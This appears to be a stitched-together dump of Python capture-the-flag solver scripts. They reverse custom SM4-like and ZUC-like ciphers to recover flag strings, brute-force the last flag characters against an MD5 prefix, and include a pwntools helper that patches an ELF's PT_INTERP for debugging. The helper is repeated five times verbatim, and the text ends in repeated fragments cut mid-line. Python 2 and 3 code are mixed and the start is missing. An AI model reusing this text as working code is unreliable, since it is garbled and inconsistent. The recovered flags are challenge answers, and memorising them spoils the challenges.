0x00000049\n0x00000010  0x000000b4  0x0000006f  0x000000ae\n0x000000a8  0x00000078  0x000000b6  0x000000be\n0x00000025  0x000000a8  0x00000040  0x0000008c\n0x000000a8  0x00000014  0x00000038  0x00000021\n0x0000002b  0x0000007d  0x000000ca  0x000000cb\n0x00000053  0x00000064  0x0000005e  0x000000b5\n0x000000f3  0x000000ed  0x0000005a  0x000000a8\n0x00000019  0x00000075  0x000000af  0x000000ff\n0x00000013  0x000000f1  0x00000097  0x000000ba\n0x00000064  0x0000001f  0x00000094  0x000000b8\n0x00000063  0x000000a6  0x000000f7  0x000000eb\n0x00000027  0x00000083  0x0000007a  0x000000c6\n0x00000011  0x0000007c  0x000000af  0x000000ae\n0x00000018  0x0000008e  0x000000fc  0x0000003c\n0x00000002  0x000000e4  0x0000003d  0x00000013\n0x000000a2  0x000000ba  0x0000002a  0x0000006d\n0x000000f8  0x0000000c  0x00000023  0x000000b3\n0x00000024  0x000000c6  0x0000002d  0x000000ab\n0x000000ee  0x0000007a  0x00000047  0x000000b8\n0x000000be  0x00000072  0x000000ee  0x000000db\n0x00000067  0x0000006b  0x000000c0  0x00000014\n0x0000005f  0x000000ee  0x00000040  0x00000014\n0x00000136  0x0000005c  0x000000c6  0x000000c2\n0x00000077  0x00000098  0x0000000e  0x00000090\n0x00000046  0x00000051  0x00000078  0x00000078\n0x000000e7  0x00000083  0x000000e1  0x00000009\n0x000000e5  0x0000000c  0x0000007f  0x00000066\n0x00000038  0x000000e5  0x0000002d  0x000000d9\n0x0000007b  0x000000dd  0x000000fd  0x00000089\n0x0000007b  0x00000031  0x00000055  0x0000008a\n0x0000008e  0x000000e1  0x0000002d  0x0000002a\n0x00000030  0x00000091  0x000000f6  0x00000056\n0x000000f4  0x00000067  0x000000d4  0x000000e9\n0x0000009a  0x0000004a  0x35442823  0x989ed6e7\n0xb8fb8309  0x05ef44c6  0xa3ddf747  0x6b8ef034\n0x2f901751  0x39db4c86  0x352865a2  0xa5ba1583\n0xf01605cf  0x8e442a9c  0x08e2f17e  0x01bfad73\n0x011f679b  0x011d0cac  0x00b92d7a  0x039a0cc6\n0x09a2023d  0x0cb8a676  0x0588b770  0x08775067\n0x0e197e2f  0x060e5aa0  0x0da9c7a3  0x046d6c91\n0x036e30f7  0x0dc5a4c9  0x06cd556a  0x02dac8af\n0x08acf8cb  0x0be7ef6f  0x0648048d  0x0ff310f6\n0x03e1e240  0x0241a624  0x0723bde2  0x033d53a7\n0x00d479ad  0x00f0a3c0  0x03633ed7  0x03b3ee92\n0x015656e9  0x02d78859  0x0d790f9e  0x0eeadaf6\n0x0df0d5b9  0x026a1b7c  0x0abc4739  0x0fc5b7ba\n0x03967947  0x0aff86fa  0x01d771f3  0x0d1be16b\n0x0769ad2d  0x052a94d7  0x01527169  0x05ce25ea\n0x0408870b  0x0c2b2dd6  0x066123f7  0x0abc0030\n0x0f47f07a  0x088857f0  0x01f7a340  0x04c40c1e\n0x0b1009f1  0x00183249  0x08a17fe7  0x0261c9cf\n0x055980af  0x0574bc83  0x0d61a6ea  0x0a7b793c\n0x0f0189c1  0x0c5a823c  0x059b8e01  0x0e974526\n0x0f6c4646  0x0632a1f6  0x0d021dab  0x049682d6\n0x00be8011  0x0a0b9da1  0x0a51b86c  0x0aac81ad\n0x08f12160  0x00677a53  0x09fec32c  0x07647ed3\n0x0fee4e95  0x0ba43234  0x0ca00a70  0x05a8f630\n0x0864f8d1  0x022e0abd  0x04bcd429  0x0ff2294e\n0x0e771cd6  0x0a112d44  0x0588b8ee  0x0a90a6c5\n0x0800076c  0x0acbaf63  0x0f03e9df  0x0b0ba40a\n0x0ad32a4d  0x08cbbd42\n\"\"\"\n_a = [int(x[2:], 16) for x in _a.split()]\n\ndef lookup(a, x):\n    y = 0\n    for i in range(4):\n        t = (x >> (8*i)) & 0xff\n        yi = a[814 + t] ^ a[558 + t] ^ a[302 + t] ^ a[46 + t]\n        y |= yi << (8*i)\n    return y\n\ndef ror(x, y):\n    return (x >> y) | ((x << (32-y)) & 0xffffffff)\n\ndef rol(x, y):\n    return ((x << y) & 0xffffffff) | (x >> (32-y))\n\ndef hahaha(a):\n    buf = [0] * 36\n    for i in range(4):\n        buf[i] = a[1078+i] ^ a[1074+i] ^ a[1070+i] ^ a[2+i]\n    for i in range(32):\n        t = a[1146+i] ^ a[1114+i] ^ a[1082+i]\n        t = (t << 4) & 0xffffffff\n        if (i & 3) == 0:\n            t |= 5\n        elif (i & 3) == 1:\n            t |= 1\n        elif (i & 3) == 2:\n            t |= 0xd\n        elif (i & 3) == 3:\n            t |= 9\n        v = lookup(a, t ^ buf[i+1] ^ buf[i+2] ^ buf[i+3])\n        v = ror(v, 9) ^ rol(v, 13) ^ v\n        v ^= buf[i]\n        buf[i+4] = v\n        a[i+6] = v\n\ndef get_answer1(x):\n    global _a\n    a = _a[:]\n    x = x[:16].ljust(16, '\\x00')\n    for i in range(4):\n        a[42 + i] = struct.unpack('<i', x[i*4:i*4+4].encode())[0]\n    hahaha(a)\n    buf = [0] * 36\n    for i in range(4):\n        buf[i] = a[42+i]\n    for i in range(32):\n        v = buf[i+1] ^ buf[i+2] ^ buf[i+3] ^ a[i+6]\n        v = lookup(a, v)\n        v = ror(v, 14) ^ rol(v, 10) ^ rol(v, 2) ^ ror(v, 8) ^ v\n        buf[i+4] = v ^ buf[i]\n    y = buf[32:36]\n    y = y[::-1]\n    return y\n\ndef solve():\n    global _a\n    a = _a[:]\n    hahaha(a)\n    buf = [0] * 36\n    buf[32:] = [0x6BC6B8F3, 0x0A23E4711, 0x1D43D3E5, 0x4BAB4224][::-1]\n    for i in range(31, -1, -1):\n        v = buf[i+1] ^ buf[i+2] ^ buf[i+3] ^ a[i+6]\n        v = lookup(a, v)\n        v = ror(v, 14) ^ rol(v, 10) ^ rol(v, 2) ^ ror(v, 8) ^ v\n        buf[i] = buf[i+4] ^ v\n    return buf[:4]\n\ns = solve()\nflag1 = \"\"\nfor i in range(4):\n    for j in range(4):\n        flag1 += chr((s[i] >> (8*j)) & 0xff)\nprint(flag1) # aac1b72f-6846-40\n\nans1 = get_answer1(flag1)\nassert ans1 == [0x6BC6B8F3, 0x0A23E4711, 0x1D43D3E5, 0x4BAB4224]\n\n#!/usr/bin/env python3\nimport struct\n\nflag_part1 = '???' * 16\n\nkbuf2 = [0x96, 0x96, 0x96, 0x7e]\nkbuf3 = [0x1d, 0xeb, 0x14, 0xeb, 0xa3, 0x28, 0x15, 0x28, 0x99, 0x99, 0x99, 0xd1, 0x52, 0x96, 0x9e, 0xd6]\nfor i in range(16):\n    kbuf3[i] ^= ord(flag_part1[i])\n\nm82 = \\\n\"\"\"\n0x002a  0x00e7  0x0041  0x00fc  0x0046  0x0006  0x0038  0x0001\n0x00ee  0x0002  0x0079  0x0085  0x0038  0x003e  0x0090  0x00af\n0x00ae  0x0041  0x00c6  0x000b  0x002a  0x00c0  0x00d7  0x006b\n0x0001  0x000e  0x0099  0x00f7  0x00d4  0x002c  0x00b9  0x00ac\n0x00ed  0x000b  0x00ec  0x0015  0x0061  0x00f3  0x003a  0x0069\n0x009b  0x005f  0x000e  0x0011  0x0021  0x0056  0x00fc  0x009d\n0x009e  0x00db  0x00b4  0x0004  0x00a8  0x00a0  0x0046  0x009b\n0x00c6  0x00ac  0x0019  0x00d1  0x0042  0x006f  0x0094  0x00d3\n0x005e  0x00d5  0x0026  0x009b  0x008f  0x001e  0x0069  0x00a8\n0x0049  0x0094  0x0000  0x004c  0x0020  0x006d  0x000d  0x001b\n0x007a  0x0073  0x00ed  0x0001  0x003d  0x0038  0x009a  0x00f3\n0x00f1  0x0058  0x00af  0x0055  0x00fd  0x003c  0x00b9  0x00e2\n0x00bd  0x00cb  0x00b6  0x0050  0x0089  0x0099  0x00e6  0x007b\n0x00d4  0x0059  0x0078  0x00dc  0x00e0  0x006e  0x00ef  0x002e\n0x00c3  0x00d5  0x006a  0x009f  0x003d  0x00a3  0x0030  0x00a0\n0x002c  0x0044  0x0023  0x006e  0x00dd  0x00fd  0x003b  0x0025\n0x00a0  0x0060  0x0021  0x00c8  0x00d6  0x006d  0x0009  0x00ae\n0x00bc  0x00fd  0x007f  0x008c  0x00eb  0x0013  0x0010  0x00fe\n0x004d  0x00b0  0x0074  0x0088  0x004e  0x00f9  0x0053  0x0075\n0x00a6  0x0001  0x00e5  0x0001  0x0015  0x00cd  0x00d7  0x0097\n0x00b4  0x008a  0x000f  0x00c7  0x0033  0x0030  0x00d5  0x0023\n0x00cc  0x00d9  0x0048  0x009a  0x0070  0x0001  0x00ef  0x0058\n0x0015  0x0017  0x008c  0x0054  0x0089  0x0041  0x0030  0x004b\n0x00b6  0x0067  0x00d2  0x00be  0x0004  0x002d  0x0042  0x001c\n0x00cf  0x00a9  0x01ab  0x0013  0x0016  0x00c1  0x0026  0x0069\n0x00fb  0x009c  0x0049  0x006e  0x0029  0x0045  0x003c  0x00b0\n0x003e  0x00bc  0x00f1  0x0007  0x0066  0x00e2  0x0032  0x00a2\n0x0011  0x00df  0x00b5  0x01d6  0x002f  0x00a7  0x00c8  0x00ee\n0x002d  0x000b  0x0098  0x0078  0x001f  0x0098  0x0022  0x0072\n0x00f4  0x0048  0x00a1  0x0000  0x004f  0x00f7  0x007b  0x0099\n0x00ef  0x0085  0x0058  0x0017  0x00d9  0x0067  0x00a2  0x0002\n0x00c8  0x003c  0x00f0  0x008c  0x009c  0x00ad  0x00e9  0x0002\n\"\"\"\n\nm114 = \\\n\"\"\"\n0x0014  0x0095  0x001a  0x00bb  0x008c  0x00e6  0x0038  0x0032\n0x00ea  0x00d3  0x002d  0x001d  0x0031  0x0087  0x00fd  0x0064\n0x00d5  0x005a  0x003f  0x0039  0x0085  0x005d  0x00bd  0x00ce\n0x00b9  0x0023  0x0065  0x00ea  0x00dc  0x007f  0x00ba  0x003c\n0x00a0  0x0045  0x0068  0x008c  0x0085  0x003d  0x00e3  0x00f8\n0x0046  0x00e9  0x008b  0x0059  0x00aa  0x007f  0x0092  0x0031\n0x0053  0x001a  0x004c  0x001a  0x00db  0x00e3  0x002f  0x005d\n0x0073  0x0011  0x00e4  0x00e8  0x0021  0x004f  0x0040  0x00eb\n0x0028  0x00a8  0x0094  0x003c  0x0040  0x00f3  0x003e  0x006d\n0x00ba  0x00b8  0x00bb  0x0058  0x0001  0x006b  0x0058  0x0080\n0x0099  0x009c  0x00b3  0x0030  0x0072  0x0047  0x00c0  0x0057\n0x00fc  0x00da  0x00fe  0x001c  0x00a2  0x0086  0x00e1  0x00fe\n0x00f7  0x00dd  0x0063  0x0047  0x0021  0x000b  0x00c2  0x0064\n0x0058  0x00a6  0x00a0  0x0072  0x00ce  0x006f  0x003c  0x0083\n0x00f8  0x009e  0x00b0  0x00d9  0x00d6  0x006a  0x00ee  0x003a\n0x00a3  0x00c3  0x00f4  0x0054  0x005d  0x0092  0x0014  0x00ed\n0x0011  0x00d4  0x0016  0x003f  0x00dc  0x004f  0x001a  0x0086\n0x00c0  0x0031  0x0043  0x0005  0x002c  0x00d0  0x0086  0x00a8\n0x004a  0x000f  0x000a  0x0078  0x0045  0x00d2  0x00c4  0x0027\n0x0093  0x0040  0x009c  0x0060  0x00b3  0x0081  0x00c7  0x0069\n0x0008  0x00ac  0x009a  0x004f  0x00b9  0x0080  0x0076  0x00d8\n0x000c  0x00c1  0x00dc  0x0068  0x0091  0x00e4  0x0006  0x0005\n0x00c5  0x00cb  0x009d  0x0032  0x00ed  0x001d  0x00dc  0x0012\n0x00f4  0x0012  0x00c0  0x004b  0x0070  0x00b1  0x00e8  0x003f\n0x00c1  0x002f  0x0100  0x00ad  0x003c  0x00c3  0x00c1  0x000e\n0x001d  0x00d8  0x00eb  0x0002  0x00eb  0x00d6  0x00a3  0x0041\n0x00c8  0x0046  0x00c7  0x00d5  0x0036  0x008a  0x00ac  0x00c0\n0x0060  0x00ca  0x0088  0x0100  0x006f  0x0063  0x002a  0x00e1\n0x00a3  0x0088  0x00ef  0x0013  0x003a  0x009d  0x001d  0x007e\n0x00c4  0x00a2  0x00d1  0x00b7  0x00ee  0x001f  0x00d2  0x00fc\n0x0062  0x00a2  0x0042  0x00cc  0x0058  0x00d4  0x0002  0x00f6\n0x008d  0x0046  0x00e9  0x0053  0x0072  0x00d5  0x00dd  0x0062\n\"\"\"\n\nm146 = \\\n\"\"\"\n0x00b6  0x00f8  0x0025  0x00b2  0x00d6  0x001c  0x00f9  0x00f3\n0x0051  0x00a9  0x001c  0x0073  0x0040  0x004e  0x0037  0x000d\n0x0099  0x00f3  0x0038  0x00dd  0x0039  0x0047  0x00f9  0x00c6\n0x00b9  0x0052  0x00d8  0x00ef  0x0088  0x004e  0x0000  0x001a\n0x008f  0x00b5  0x00e9  0x002e  0x002e  0x002c  0x00b2  0x005d\n0x0020  0x0091  0x0059  0x0040  0x003a  0x00e6  0x0030  0x0090\n0x00f4  0x000c  0x0083  0x006d  0x00f6  0x00ef  0x0015  0x00f0\n0x00fe  0x0018  0x00fc  0x00cb  0x0027  0x00ae  0x0054  0x00a7\n0x0007  0x0017  0x0029  0x00c0  0x00be  0x00c4  0x0079  0x0003\n0x0035  0x0088  0x005c  0x0063  0x008d  0x00b6  0x0030  0x00a8\n0x00e0  0x002e  0x001c  0x00bc  0x004a  0x00a6  0x0043  0x008b\n0x0087  0x009c  0x00e5  0x008e  0x0078  0x0025  0x00b1  0x00be\n0x00df  0x00ca  0x00a6  0x0097  0x00c7  0x007a  0x0056  0x00bb\n0x0093  0x0067  0x000e  0x008e  0x00b8  0x009d  0x0049  0x00b0\n0x0064  0x009c  0x00b7  0x0016  0x00ea  0x007f  0x002f  0x0018\n0x0000  0x00ff  0x00be  0x009e  0x00e9  0x001e  0x0065  0x0039\n0x00b1  0x0051  0x000b  0x00db  0x00dd  0x0070  0x0056  0x0012\n0x0010  0x000a  0x000d  0x00bd  0x002c  0x0079  0x0065  0x0072\n0x0055  0x003a  0x00f4  0x0074  0x00c2  0x0068  0x0094  0x0062\n0x00a6  0x00b2  0x00f8  0x0041  0x0037  0x0018  0x0092  0x00f5\n0x00a1  0x00ed  0x00ab  0x004a  0x0082  0x004c  0x00d0  0x00b2\n0x00d2  0x006d  0x006a  0x004f  0x00cb  0x0007  0x00d8  0x000b\n0x00a5  0x0071  0x00e1  0x00fe  0x0034  0x005c  0x00f7  0x0093\n0x0055  0x0037  0x0011  0x009e  0x008e  0x00eb  0x00d9  0x0031\n0x00b1  0x0039  0x002a  0x007f  0x0082  0x00bc  0x009d  0x0008\n0x00c4  0x0037  0x0006  0x00b0  0x000e  0x0062  0x0057  0x00b4\n0x00ea  0x00c9  0x00bf  0x00d1  0x0000  0x0064  0x00fd  0x0067\n0x0085  0x00ba  0x00ad  0x0064  0x00ae  0x004d  0x0085  0x000c\n0x0040  0x00b5  0x00a9  0x00f5  0x0016  0x00b3  0x0002  0x0059\n0x0022  0x00d3  0x00d0  0x0058  0x0035  0x008d  0x0036  0x00ea\n0x00ee  0x004b  0x002d  0x001a  0x0009  0x0014  0x006c  0x006e\n0x0097  0x00c3  0x0074  0x00cf  0x0063  0x00d4  0x00fa  0x00c1\n\"\"\"\n\nm178 = \\\n\"\"\"\n0x00e3  0x003a  0x0046  0x00c3  0x00ed  0x00d4  0x00be  0x0075\n0x00ce  0x0095  0x00c6  0x0028  0x0069  0x00e4  0x00ca  0x007a\n0x0015  0x0036  0x00ac  0x00d1  0x009f  0x005d  0x00ea  0x00c6\n0x005a  0x00fa  0x00ce  0x009d  0x00c8  0x00b7  0x00f8  0x0058\n0x00cb  0x0093  0x0081  0x00b8  0x00af  0x00f5  0x00f7  0x0063\n0x0030  0x00e7  0x009f  0x00e7  0x00b1  0x00df  0x0073  0x0071\n0x00ce  0x00b9  0x00d5  0x0047  0x0036  0x0082  0x00a6  0x00f5\n0x00dc  0x007e  0x0043  0x0017  0x002c  0x0054  0x0036  0x00ef\n0x00da  0x0037  0x0038  0x00c6  0x0088  0x000d  0x00b8  0x00cc\n0x00c3  0x00af  0x000e  0x00d8  0x00e4  0x0043  0x00e4  0x002f\n0x009f  0x00aa  0x0050  0x006e  0x00d6  0x00f1  0x00e7  0x0037\n0x00c8  0x0006  0x003a  0x0070  0x00ae  0x00a8  0x00cb  0x0055\n0x00f4  0x0099  0x007e  0x00cb  0x0066  0x006e  0x0041  0x0040\n0x00b0  0x00b2  0x0073  0x00be  0x00df  0x00ee  0x0041  0x00b9\n0x008a  0x002b  0x00c7  0x0029  0x008b  0x00cd  0x0036  0x0096\n0x004e  0x001a  0x00f5  0x000d  0x0066  0x0043  0x00be  0x0090\n0x001c  0x00a0  0x00a5  0x00f5  0x0016  0x007d  0x00aa  0x00e6\n0x003d  0x004c  0x0063  0x00a0  0x00bb  0x0091  0x00b4  0x009b\n0x0018  0x000d  0x0051  0x0001  0x009c  0x00eb  0x000a  0x00c9\n0x0024  0x002f  0x0041  0x005d  0x00d7  0x00d5  0x00db  0x007c\n0x00a0  0x005b  0x0016  0x0012  0x00a6  0x00ee  0x008f  0x008a\n0x00aa  0x00f4  0x007f  0x00df  0x009b  0x00bf  0x004d  0x00ef\n0x0075  0x00e0  0x0026  0x0030  0x00d9  0x0053  0x0043  0x00fc\n0x00f5  0x00fb  0x00e1  0x009c  0x00c4  0x0092  0x001a  0x00ef\n0x0012  0x00d6  0x00c0  0x002e  0x0064  0x00d7  0x0085  0x00e4\n0x00df  0x001b  0x0086  0x0047  0x007a  0x0085  0x00a8  0x0095\n0x00b0  0x00a3  0x00eb  0x00cf  0x0041  0x0055  0x006f  0x0052\n0x0041  0x0089  0x00aa  0x006e  0x0014  0x0033  0x008b  0x0038\n0x00c8  0x0004  0x0031  0x0089  0x00e5  0x008e  0x0062  0x0035\n0x0059  0x0019  0x0003  0x0047  0x0007  0x00e8  0x0032  0x00c2\n0x008a  0x00f5  0x00a8  0x0081  0x0026  0x004d  0x00e6  0x00b9\n0x0027  0x00e6  0x00d8  0x0060  0x0071  0x00d7  0x0018  0x0033\n\"\"\"\n\nm82 = [int(x[2:], 16) for x in m82.split()]\nm114 = [int(x[2:], 16) for x in m114.split()]\nm146 = [int(x[2:], 16) for x in m146.split()]\nm178 = [int(x[2:], 16) for x in m178.split()]\n\ndef rol(x, y):\n    return ((x << y) & 0xffffffff) | (x >> (32-y))\n\ndef init(ax):\n    ans = [0] * 82\n    for i in range(4):\n        ans[1+i] = kbuf2[i]\n    for i in range(16):\n        ans[6+i] = kbuf3[i]\n        #ans[6+i+16] = kbuf3[i]\n    ans[5] = 23\n    for i in range(5):\n        ans[77+i] = ax[i]\n    for i in range(22, 38):\n        ans[i] = ans[i-16]\n    for i in range(4):\n        ans[38+i] = ans[1+i]\n    ans[42] = ans[5] << 3\n    ans[42] |= 1\n    for i in range(46, 51):\n        ans[i] = ans[i-8]\n    return ans\n\ndef hh(buf):\n    h1 = [0x4D700, 0x26BC00, 0x226B00, 0x135E00, 0x178900, 0x35E200, 0x313500, 0x9AF00, 0xD7800, 0x2F1300, 0x2BC400, 0x1AF100, 0x1E2600, 0x3C4D00, 0x389A00, 0x47AC00]\n    for i in range(16):\n        buf[55+i] = buf[22+i] << 23\n        buf[55+i] |= h1[i]\n        buf[55+i] |= buf[38+i]\n        if i % 2 == 0:\n            buf[55+i] |= 0x400000\n    for i in range(16):\n        buf[55+i] &= 0x7FFFFFFF\n\ndef wtf0(buf, x1, x2, x3):\n    ans = (x1 ^ buf[75]) + buf[76]\n    ans &= 0xFFFFFFFF\n    t1 = (buf[75] + x2) & 0xFFFFFFFF\n    t2 = (buf[76] ^ x3) & 0xFFFFFFFF\n    t = ((t1 & 0xFFFF) << 16) | (t2 >> 16)\n    v24 = t ^ rol(t, 2) ^ rol(t, 10) ^ rol(t, 18) ^ rol(t, 24)\n    t = (t1 >> 16) | ((t2 & 0xFFFF) << 16)\n    v30 = t ^ rol(t, 8) ^ rol(t, 14) ^ rol(t, 22) ^ rol(t, 30)\n    buf[75] = wtf3(v24) | (wtf2(v24 >> 8) << 8) | (wtf3(v24 >> 16) << 16) | (wtf2(v24 >> 24) << 24)\n    buf[76] = wtf3(v30) | (wtf2(v30 >> 8) << 8) | (wtf3(v30 >> 16) << 16) | (wtf2(v30 >> 24) << 24)\n    return ans\n\n\ndef wtf1(buf):\n    buf[71] = buf[70] & 0x7FFF8000\n    buf[71] <<= 1\n    buf[71] |= buf[69] & 0xffff\n    buf[72] = buf[66] & 0xffff\n    buf[72] <<= 16\n    buf[72] |= buf[64] >> 15\n    buf[73] = buf[62] & 0xffff\n    buf[73] <<= 16\n    buf[73] |= buf[60] >> 15\n    buf[74] = buf[57] & 0xffff\n    buf[74] <<= 16\n    buf[74] |= buf[55] >> 15\n\ndef wtf2(x):\n    x &= 0xff\n    return m114[x] ^ m82[x]\n\ndef wtf3(x):\n    x &= 0xff\n    return m178[x] ^ m146[x]\n\ndef wtf4(buf, x):\n    v1 = 0x8000 * buf[70]\n    v2 = 0x20000 * buf[68]\n    v1 += v2\n    v2 = 2**20 * buf[59]\n    v1 += v2\n    v2 = 2**21 * buf[65]\n    v1 += v2\n    v1 += buf[55]\n    v2 = 0x100 * buf[55]\n    v1 += v2\n    v1 %= (2**31-1)\n    v1 = (v1 + x) % (2**31-1)\n    if v1 == 0:\n        v1 = 2**31-1\n    for i in range(55, 70):\n        buf[i] = buf[i+1]\n    buf[70] = v1\n\ndef wtf5(buf):\n    v1 = 0x8000 * buf[70]\n    v2 = 0x20000 * buf[68]\n    v1 += v2\n    v2 = 2**20 * buf[59]\n    v1 += v2\n    v2 = 2**21 * buf[65]\n    v1 += v2\n    v1 += buf[55]\n    v2 = 0x100 * buf[55]\n    v1 += v2\n    v1 %= (2**31-1)\n    if v1 == 0:\n        v1 = 2**31-1\n    for i in range(55, 70):\n        buf[i] = buf[i+1]\n    buf[70] = v1\n\ndef get_answer2(x):\n    x = x[:20].ljust(20, '\\x00')\n    ax = [0] * 5\n    for i in range(5):\n        ax[i] = struct.unpack('<i', x[i*4:i*4+4].encode())[0]\n    ans = []\n    buf = init(ax)\n    hh(buf)\n    for i in range(32):\n        wtf1(buf)\n        t = wtf0(buf, buf[71], buf[72], buf[73])\n        wtf4(buf, t>>1)\n    wtf1(buf)\n    v19 = wtf0(buf, buf[71], buf[72], buf[73])\n    buf[77] ^= v19\n    wtf5(buf)\n\n    wtf1(buf)\n    t = wtf0(buf, buf[71], buf[72], buf[73])\n    t ^= buf[74]\n    wtf5(buf)\n    buf[77] ^= t\n    ans.append(buf[77])\n\n    wtf1(buf)\n    t = wtf0(buf, buf[71], buf[72], buf[73])\n    t ^= buf[74]\n    wtf5(buf)\n    buf[78] ^= v19\n    buf[78] ^= t\n    ans.append(buf[78])\n\n    wtf1(buf)\n    t = wtf0(buf, buf[71], buf[72], buf[73])\n    t ^= buf[74]\n    wtf5(buf)\n    buf[79] ^= t\n    ans.append(buf[79])\n\n    wtf1(buf)\n    t = wtf0(buf, buf[71], buf[72], buf[73])\n    t ^= buf[74]\n    wtf5(buf)\n    buf[80] ^= t\n    ans.append(buf[80])\n\n    wtf1(buf)\n    t = wtf0(buf, buf[71], buf[72], buf[73])\n    t ^= buf[74]\n    wtf5(buf)\n    buf[81] ^= v19\n    buf[81] ^= t\n    ans.append(buf[81])\n\n    return ans\n\ndef solve():\n    s = ''\n    ans = get_answer2('\\x00' * 20)\n    good_ans = [0xCF2D1915, 0x407AEF01, 0x88D0865B, 0x578F07E0, 0x4809A272]\n    for i in range(5):\n        v = ans[i] ^ good_ans[i]\n        for j in range(4):\n            s += chr((v >> (8*j)) & 0xff)\n    return s\n\nflag2 = solve()\nprint(flag2) # 03-be49-2afa79d24e2c\n\nans = get_answer2(flag2)\nassert ans == [0xCF2D1915, 0x407AEF01, 0x88D0865B, 0x578F07E0, 0x4809A272]\n\n#!/usr/bin/env python3\nfrom itertools import product\nfrom hashlib import md5\n\nhash_prefix = '94bda84799d'\n#flag = '82600087\\x00\\x00\\x00\\x00\\x00-4524-9eaa-69646e04bf68'\nstart = '82600087'\nend = '-4524-9eaa-69646e04bf68\\n'\ncharset = '0123456789abcdef-'\ncandidates = product(charset, repeat=5)\n\nfor it in candidates:\n    candidate = ''.join(it)\n    flag = start + candidate + end\n    md5sum = md5(flag.encode()).hexdigest()\n    if md5sum.startswith(hash_prefix):\n        print(f'Flag: flag{{{flag}}}')\n        break\n\n    print \"haha2\"\n    for segment in binary.segments:\n        if segment.header['p_type'] == 'PT_INTERP':\n            size = segment.header['p_memsz']\n            addr = segment.header['p_paddr']\n            data = segment.data()\n            if size <= len(ld):\n                log.failure(\"Failed to change PT_INTERP from {} to {}\".format(data, ld))\n                return None\n            binary.write(addr, ld.ljust(size, '\\0'))\n            if not os.access('/tmp/pwn', os.F_OK): \n              os.mkdir('/tmp/pwn')\n            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))\n            if os.access(path, os.F_OK): \n                os.remove(path)\n                info(\"Removing exist file {}\".format(path))\n            binary.save(path)    \n            os.chmod(path, 0b111000000) #rwx------\n    success(\"PT_INTERP has changed from {} to {}. Using temp file {}\".format(data, ld, path)) \n    print path\n    return ELF(path)\n\n\n    print \"haha2\"\n    for segment in binary.segments:\n        if segment.header['p_type'] == 'PT_INTERP':\n            size = segment.header['p_memsz']\n            addr = segment.header['p_paddr']\n            data = segment.data()\n            if size <= len(ld):\n                log.failure(\"Failed to change PT_INTERP from {} to {}\".format(data, ld))\n                return None\n            binary.write(addr, ld.ljust(size, '\\0'))\n            if not os.access('/tmp/pwn', os.F_OK): \n              os.mkdir('/tmp/pwn')\n            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))\n            if os.access(path, os.F_OK): \n                os.remove(path)\n                info(\"Removing exist file {}\".format(path))\n            binary.save(path)    \n            os.chmod(path, 0b111000000) #rwx------\n    success(\"PT_INTERP has changed from {} to {}. Using temp file {}\".format(data, ld, path)) \n    print path\n    return ELF(path)\n\n\n    print \"haha2\"\n    for segment in binary.segments:\n        if segment.header['p_type'] == 'PT_INTERP':\n            size = segment.header['p_memsz']\n            addr = segment.header['p_paddr']\n            data = segment.data()\n            if size <= len(ld):\n                log.failure(\"Failed to change PT_INTERP from {} to {}\".format(data, ld))\n                return None\n            binary.write(addr, ld.ljust(size, '\\0'))\n            if not os.access('/tmp/pwn', os.F_OK): \n              os.mkdir('/tmp/pwn')\n            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))\n            if os.access(path, os.F_OK): \n                os.remove(path)\n                info(\"Removing exist file {}\".format(path))\n            binary.save(path)    \n            os.chmod(path, 0b111000000) #rwx------\n    success(\"PT_INTERP has changed from {} to {}. Using temp file {}\".format(data, ld, path)) \n    print path\n    return ELF(path)\n\n\n    print \"haha2\"\n    for segment in binary.segments:\n        if segment.header['p_type'] == 'PT_INTERP':\n            size = segment.header['p_memsz']\n            addr = segment.header['p_paddr']\n            data = segment.data()\n            if size <= len(ld):\n                log.failure(\"Failed to change PT_INTERP from {} to {}\".format(data, ld))\n                return None\n            binary.write(addr, ld.ljust(size, '\\0'))\n            if not os.access('/tmp/pwn', os.F_OK): \n              os.mkdir('/tmp/pwn')\n            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))\n            if os.access(path, os.F_OK): \n                os.remove(path)\n                info(\"Removing exist file {}\".format(path))\n            binary.save(path)    \n            os.chmod(path, 0b111000000) #rwx------\n    success(\"PT_INTERP has changed from {} to {}. Using temp file {}\".format(data, ld, path)) \n    print path\n    return ELF(path)\n\n\n    print \"haha2\"\n    for segment in binary.segments:\n        if segment.header['p_type'] == 'PT_INTERP':\n            size = segment.header['p_memsz']\n            addr = segment.header['p_paddr']\n            data = segment.data()\n            if size <= len(ld):\n                log.failure(\"Failed to change PT_INTERP from {} to {}\".format(data, ld))\n                return None\n            binary.write(addr, ld.ljust(size, '\\0'))\n            if not os.access('/tmp/pwn', os.F_OK): \n              os.mkdir('/tmp/pwn')\n            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))\n            if os.access(path, os.F_OK): \n                os.remove(path)\n                info(\"Removing exist file {}\".format(path))\n            binary.save(path)    \n            os.chmod(path, 0b111000000) #rwx------\n    success(\"PT_INTERP has changed from {} to {}. Using temp file {}\".format(data, ld, path)) \n    print path\n    return ELF(path)\n\n\n    for i in range(27 , 128):\n        for j in range(27 , 128):\n            a = i\n            b = j\n            v19 = ((a | (b << 8)) ^ xor_value[0 + k * 4 ])\n            dest1 = (v19 ^ keys) & 0xffff\n            if dest1 == dest_value[0 + k * 4]:\n                # print hex((v19 ^ 0x51e3) & 0xff)\n                keys1 = v19\n                s0 = chr(a)\n                s2 = chr(b)\n\n\n    for i in range(27 , 128):\n        for j in range(27 , 128):\n            a = i\n            b = j\n            v19 = ((a | (b << 8)) ^ xor_value[1 + k * 4])\n            dest1 = (v19 ^ keys) & 0xffff\n            if dest1 == dest_value[1 + k * 4]:\n                # print hex((v19 ^ 0x51e3) & 0xff)\n                keys2 = v19\n                s1 = chr(a)\n                s3 = chr(b)\n\n\n    for i in range(27 , 128):\n        for j in range(27 , 128):\n            a = i\n            b = j\n            v19 = ((a | (b << 8)) ^ xor_value[2 + k * 4])\n            dest1 = (v19 ^ keys) & 0xffff\n            if dest1 == dest_value[2 + k * 4]:\n                # print hex((v19 ^ 0x51e3) & 0xff)\n                print hex(v19)\n                keys3 = v19\n                s7 = chr(a)\n                s4 = chr(b)\n\n\n    for i in range(27 , 128):\n        for j in range(27 , 128):\n            a = i\n            b = j\n            v19 = ((a | (b << 8)) ^ xor_value[3 + k * 4])\n            dest1 = (v19 ^ keys) & 0xffff\n            if dest1 == dest_value[3 + k * 4]:\n                # print hex((v19 ^ 0x51e3) & 